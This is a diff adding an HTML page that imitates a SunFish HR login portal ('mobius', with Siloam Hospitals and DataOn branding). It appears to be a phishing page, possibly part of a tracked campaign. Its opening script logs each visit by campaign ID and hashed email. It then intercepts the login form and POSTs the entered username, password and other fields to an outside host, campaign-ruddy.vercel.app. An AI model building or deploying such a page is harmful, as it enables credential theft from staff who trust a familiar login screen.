@@ -1,0 +1,294 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>mobius</title>
+<link rel="stylesheet" type="text/css" href="css/display.css">
+<link rel="stylesheet" type="text/css" href="css/style.css">
+<script>
+    function getParameters() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const hashEmail = urlParams.get('hashEmail');
+        const campaignId = urlParams.get('campaignId');
+        return [campaignId, hashEmail];
+    }
+
+    function sendToTrackerAPI(httpMethod, campaignId, type, hashEmail, payload = null) {
+        const trackerApiUrl = `https://campaign-ruddy.vercel.app/api/t/${campaignId}/${type}/${hashEmail}`;
+        const fetchOptions = {
+            method: httpMethod.toUpperCase(),
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        };
+
+        if (httpMethod.toUpperCase() === 'POST' && payload) {
+            fetchOptions.body = payload;
+        }
+
+        fetch(trackerApiUrl, fetchOptions)
+            .then(response => response.json())
+            .then(data => console.log('Tracker response:', data))
+            .catch(error => console.error('Error sending tracking request:', error));
+    }
+
+    function trackPageLoad() {
+        const param = getParameters();
+        if (param[0] && param[1]) {
+            sendToTrackerAPI('GET', param[0], 'url', param[1]);
+        } else {    
+            console.error('URL Not Completed.');
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        trackPageLoad();
+
+        const form = document.getElementById('submitFormA');
+        if (form) {
+            form.addEventListener('submit', function (event) {
+                event.preventDefault();
+                const param = getParameters();
+                const formData = new FormData(event.target);
+                let payload = "";
+
+                formData.forEach((value, key) => {
+                    payload += `${key}=${value}&`
+                });
+                payload = payload.slice(0, -1);
+
+                if (param[0] && param[1]) {
+                    sendToTrackerAPI('POST', param[0], 'fill', param[1], payload);
+                } else {
+                    console.error('URL Not Completed.');
+                }
+            });
+        }
+    });
+</script>
+<style type="text/css">
+body { margin:0; padding:0;	background:url("imgs/login-bg.png"); font:12px Verdana, Arial, Helvetica, sans-serif; color:#333}
+#login-bg {z-index:-1; background-position:center; background-repeat:no-repeat; position:absolute; width:100%; height:100%}
+#login-shadow { position:absolute; top:0; z-index:-1; width:100%; height:100%;opacity: 0.1;}
+#login-logo {background:url("imgs/sprite-login.png") no-repeat; background-position: -518px 0px; width:438px; height:296px; position:absolute; top:50%; margin-top:-190px; left:50%; margin-left: -440px;}
+#login-bg-top { background:url("imgs/login-bg-top.png") repeat-x; height:45%; width:100%; position:absolute; z-index:-2}
+#form-block {background:url("imgs/sprite-login.png") no-repeat; background-position: -96px -7px;width:423px; height:307px; position:absolute; top:50%; margin-top:-190px; left:50%}
+#title-form-block { font:bold 17px Verdana, Arial, Helvetica, sans-serif; color:#666; text-align:center; margin-top:17px; margin-bottom:17px}
+#form-block h4 { font:bold 15px Verdana, Arial, Helvetica, sans-serif; color:#666; text-align:left; margin:0; padding-left:32px; padding-bottom:5px; overflow:hidden; text-overflow:ellipsis}
+#form-login {width:370px; margin:0 auto; font:12px Verdana, Arial, Helvetica, sans-serif;}
+#form-login ul { margin:0; padding:0; list-style:none}
+#form-login ul li { padding:3px}
+#form-login ul li label { width:120px; padding:3px 5px}
+#form-login ul li input { width:200px; padding:3px 5px; border-width: 1px}
+#form-login ul li input#chkRemember {margin-left:-1px; width:15px; padding:3px 5px}
+#form-login ul li input#btn-logon
+{ background:url("imgs/sprite-login.png") no-repeat; background-position: -10px -63px; width:86px; padding:6px 0 7px; color:#fff; cursor:pointer; float:left; border:0; font-size:12px}
+#form-login ul li input#btn-logon:hover { background:url("imgs/sprite-login.png") no-repeat;background-position: -10px -33px; width:86px; padding:6px 0 7px}
+#tid_loginsaas { }
+#txtAccount { background:#d7eff8; border:1px solid #7f9db9}
+#tid_loginlink { float:left; line-height:27px; }
+#tid_loginlink a { text-decoration:none; color:#333}
+#tid_loginlink a:hover { text-decoration:underline}
+#forgot-pass a { text-decoration:none; color:#FFFFFF; line-height:32px;}/* margin-left:7px*/
+#forgot-pass a:hover { text-decoration:underline}
+#switch-mode { position:absolute; top:50%; left:50%; margin-top:-212px; margin-left:-2px;z-index: 3;padding-left: 15px;padding-right: 15px;}
+#tid_selanguage { /*position:absolute; left:50%; top:50%; margin-top:-215px; z-index:1;*/ width:400px; height:50px}
+#ver { font-size:11px; color:#666; position:absolute; top:195px; right:50px}
+.copyright { text-align:center; font-size:12px; position:absolute; top:50%; margin-top:200px; left:50%; margin-left:-250px; width:500px; padding:10px 0; opacity:0.75; background:#fff; border-radius:5px}
+#copyright_logo { background:url("imgs/sprite-login.png") no-repeat; background-position: -10px -94px; width:84px; height:36px}
+#color-theme { position:absolute; left:50%; top:50%; margin-top:-215px; z-index:2; display:none}
+.ct-1 { background:url("imgs/sprite-login.png") no-repeat; background-position: -10px -10px; width:21px; height:21px; margin-right:5px;}
+.ct-2 { background:url("imgs/sprite-login.png") no-repeat; background-position: -31px -10px; width:21px; height:21px; margin-right:5px;}
+.ct-3 { background:url("imgs/sprite-login.png") no-repeat; background-position: -52px -10px; width:21px; height:21px; margin-right:5px;}
+#color-theme div { cursor:pointer}
+#color-theme span { font-weight:bold; float:left; padding:4px 5px}
+#app-mode { /*position:absolute; left:50%; top:50%; margin-top:-215px; z-index:2;*/ display:block; float:left}
+#app-mode div { cursor:pointer; float:left}
+#app-mode span { font-weight:bold; float:left; padding:4px 5px}
+#p_langlist{ float:right; position:relative}
+#p_langlist div{float: left;padding-bottom: 3px;padding-left: 10px;padding-right: 10px;padding-top: 3px;}
+#divLang { clear:both; background:#fff; border:1px solid #999; position:absolute!important; right:0!important; top:23px!important; left:auto!important; min-width:100px}
+.passtoggle { color:gray ; user-select: none; cursor:pointer; margin-left: -20px;}
+</style>
+<script type="text/javascript">
+function MM_swapImgRestore() { //v3.0
+var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+function MM_preloadImages() { //v3.0
+var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+function MM_findObj(n, d) { //v4.01
+var p,i,x; if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+function MM_swapImage() { //v3.0
+var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+</script>
+<script src="js/display.js"></script>
+<script src="js/axios.min.js"></script>
+<script>
+String.prototype.hashCode = function() {
+var hash = 0, i, chr;
+if (this.length === 0) return hash;
+for (i = 0; i < this.length; i++) {
+chr = this.charCodeAt(i);
+hash = ((hash << 5) - hash) + chr;
+hash |= 0; // Convert to 32bit integer
+}
+return hash;
+};
+function initsso(ssotokendata){
+console.log("ssotokendata",ssotokendata)
+if(typeof(ssotokendata)!="undefined" && ssotokendata.length){
+frmLogin.action+="&ssosf6"
+checkLogin(frmLogin,null,false)
+}
+}
+function initLogin(c){var d=$sf("tid_loginform");var k=$sf("p_loginform");if(k){if(d){d.appendChild(k)}else{for(var h=0;h<k.childNodes.length;h++){k.removeChild(k.childNodes[0])}k.innerHTML="xXx";k.parentNode.removeChild(k)}}theform=document.frmLogin;if(theform){theform.action="#";theform.method="post";theform.setAttribute("autocomplete","off");theform.onsubmit=function(){return checkLogin(this,null,false,null,null,null)};if(theform.txtUserName){theform.txtUserName.disabled=false;theform.txtUserName.setAttribute("autocomplete","off");theform.txtUserName.onchange=resetPwd;theform.txtUserName.focus()}if(theform.txtAccount){theform.txtAccount.disabled=false;theform.txtAccount.focus()}if(theform.txtPassword){theform.txtPassword.disabled=false;theform.txtPassword.onkeypress=resetLogin}if(!theform.hdnts){if(bwtype=="IE"){var m=document.createElement("<INPUT name='hdnts' type='Hidden'>");m.value=c;theform.appendChild(m)}else{var m=document.createElement("INPUT");m.name="hdnts";m.type="Hidden";m.value=c;theform.appendChild(m)}}}var j=$sf("tid_loginlink");var o=$sf("p_loginlink");if(o){if(j){j.appendChild(o);o.style.display="block"}else{o.parentNode.removeChild(o)}}var a=$sf("tid_loginsaas");var g=$sf("p_loginsaas");if(g){if(a){a.appendChild(g);g.style.display="";var r=$sf("txtUserName");var l=$sf("txtAccount")}else{g.parentNode.removeChild(g)}}var q=$sf("tid_selanguage");var e=$sf("p_langlist");if(e){if(q){q.appendChild(e);e.style.display="block"}else{e.parentNode.removeChild(e)}}var n=$sf("tid_copyright");var b=$sf("p_copyright");if(b){if(n){n.appendChild(b);b.style.display="block"}else{b.parentNode.removeChild(b)}}var p=$sf("tid_themelist");var f=$sf("p_themelist");if(f){if(p){p.appendChild(f)}else{f.parentNode.removeChild(f)}}if($("#login-logo").css("background-image").search("/client/")==-1&&$sf("login-bg").style.backgroundImage.search("/client/")==-1){$("#copyright_text").attr("style","")}else{$sf("copyright_logo").style.display="";$sf("copyright_text").style.textAlign="left"}}
+</script>
+<script>
+var libpath="/sf6lib/scripts";
+var imgcpath="/sf6lib/skins/images/";
+var jsfid="";
+var redirURL="?refresh=%7Bts%20%272025%2D03%2D05%2010%3A43%3A35%27%7D";
+var sdt=new Date("2025/03/05 10:43:35");
+var ldt=new Date();
+var dtGap=sdt.getTime()-ldt.getTime();
+</script>
+<script>
+window.onload = function() {
+initLogin("{ts '2025-03-05 10:43:35'}");
+var inpusr=document.getElementById("txtAccount");
+if (inpusr) {
+if (!inpusr.disabled)
+inpusr.focus();
+else
+inpusr=null;
+}
+if (!inpusr) {
+inpusr=document.getElementById("txtUserName");
+if (inpusr) {
+if (!inpusr.disabled)
+inpusr.focus();
+}
+}
+setTimeout(remtext,100);
+if(typeof(ssotoken)!=="undefined"){
+initsso(ssotoken)
+}
+}
+function remtext() {
+var inpusr=document.getElementById("txtPassword");
+if (inpusr) {
+if (!flpwd)
+inpusr.value="";
+}
+}
+</script>
+</head>
+<body class="fullsize" bgcolor="white">
+<div id="login-bg"></div>
+<div id="switch-mode">
+<div id="color-theme">
+<span>Color Theme</span>
+<div class="ct-1" id="Image11" onClick="switchScheme(1)";></div>
+<div class="ct-2" id="Image10" onClick="switchScheme(2)";></div>
+<div class="ct-3" id="Image9" onClick="switchScheme(3)";></div>
+<!--<img src="/sf6lib/skins/sflow/images/layout/login-theme1.png" id="Image11" onClick="switchScheme(1)"; />
+<img src=imgs/login-theme2.png id="Image10" onClick="switchScheme(2)"; />
+<img src=imgs/login-theme3.png id="Image9" onClick="switchScheme(3)";/>-->
+</div>
+<div id="tid_selanguage" class="tid" style="display:none;"></div>
+</div>
+<div id="form-block">
+<div id="form-login">
+<form id="submitFormA" autocomplete="off" name="frmLogin" method="post" onSubmit="" action="#">
+<div id="tid_loginsaas"></div>
+<ul>
+<li><label>
+<font color="white"> 
+User Name</label><input type="text" name="txtUserName" id="txtUserName" value="" maxlength="50" disabled/></li>
+<li><label>Password</label><input type="password" name="txtPassword" id="txtPassword" maxlength="30" disabled/><span class="passtoggle" id="togglePassword" onclick="togglePassInput('togglePassword','txtPassword');">&#x25C9;</span></li>
+<li><label>&nbsp;</label><input type="checkbox" name="chkRemember" id="chkRemember" />Remember Me</li>
+<li><label><span style="color:white;" id="forgot-pass"></span></label><input type="Submit" value="Login" id="btn-logon">
+</li>
+<li style="clear:both"><div id="tid_loginlink"></div></li>
+</ul>
+</font> 
+<input type="Hidden" name="xxpost" value="7CD0BDB454B0F0D09E16D08754A33A97"><input type="Hidden" name="hdnts" value="2025/03/05 10:43:35">
+</form>
+</div>
+<div id="ver" title="SunFish is up to date">Ver. 6.0.2746.13396.000</div>
+</div>
+<div id="tid_copyright" class="copyright"></div>
+<div id="login-bg-top"></div>
+<div id="login-logo"></div>
+<img src=imgs/login-shadow.png id="login-shadow" />
+<div id="p_loginlink" style="display:none;">
+<script>
+document.getElementById("forgot-pass").style.color = "white";
+$sf("forgot-pass").innerHTML="<a href=\"#\">Forgot ?</a>"
+var msglogin={"invaliduser":"Please Enter Valid Username","invalidpwd":"Please Enter Valid Password","explogin":"Expired Login"
+,"formreload":"You need to Reload the login page","failedlogin":"Login Attempt Failed"};
+</script>
+</div>
+<ul id="p_loginsaas" style="display:none;">
+<li><label><font color="white"> 
+Account Name</label><input type="Text" name="txtAccount" id="txtAccount" value="" maxlength="300"></li>
+</font>
+</ul>
+<div id="p_langlist" style="display:none;">
+<div><b>Language</b></div>
+<div class="mod-selectbox-in country-flag" onclick="switchLanguage();">
+<img height="10px" width="14px" style="padding-left:4px;margin-bottom:-2px;" src=imgs/flag-en.png alt="">
+<span class="flag-" style="padding-left:5px;background: rgba(0, 0, 0, 0) no-repeat scroll right top;">
+English</span>
+</div>
+<span id="divLang" class="looktip" style="position: relative; left:0; top:0; display:none;">
+<table cellspacing="0" cellpadding="4" width="100%">
+<tr><td class="tdlink country-flag" nowrap onmousedown="switchLang('id','Bahasa','/sf6/',true);">
+<img height="10px" width="14px" style="padding-left:4px;" src=imgs/flag-id.png alt="">
+<span class="flag-" style="padding-left:5px;background: rgba(0, 0, 0, 0) no-repeat scroll right top;">
+Bahasa</span>
+</table>
+</span>
+</div>
+<div id="p_copyright" style="display:none;">
+<div id="copyright_logo" style="float: left; margin: 0px 20px;display:none;"></div>
+<div id="copyright_text" style="float: left; width: 360px;">
+This product is licensed for
+DATAON INDONESIA
+<br>
+&copy; 1999 - 2025 DataOn Technology. All Rights Reserved
+</div>
+</div>
+<div id="spAjax" style="display:none;"></div>
+<style>
+#form-block {margin-top:-82px; margin-left:163px;}
+#switch-mode {margin-top:317px; margin-left:535px;}
+#login-logo {margin-top:-190px; margin-left:-440px;}
+#tid_copyright {margin-top:222.5px; margin-left:128px;z-index: 99;}
+.icon {cursor:pointer; border:0px;}
+.dimicon {cursor:pointer; border:0px; opacity:0.7; filter:alpha(opacity=70);}
+</style>
+<script>
+////	loadLogin(document.body,'sys.sec.login');
+$('#login-logo').css('background',"url('https://mobius.siloamhospitals.com/sf6lib/images/transparent.png')")
+$('#login-logo').css({'width':0,'height':0})
+$sf('login-bg').setAttribute("style", "background-image:url('?sfid=sys.sec.getclienttheme&tokenist=sunfishsaasdataon&get=/images/layout/cust-login-bg.png')")
+$sf('login-bg-top').style.display="none";
+$sf('login-shadow').style.display="none";
+$sf('form-block').setAttribute('style',"background-image:none;height:225px;");
+</script>
+<script type="text/javascript">
+</script>
+<script type="text/javascript">deleteCookie('show_bot')</script>
+</body>
+</html>
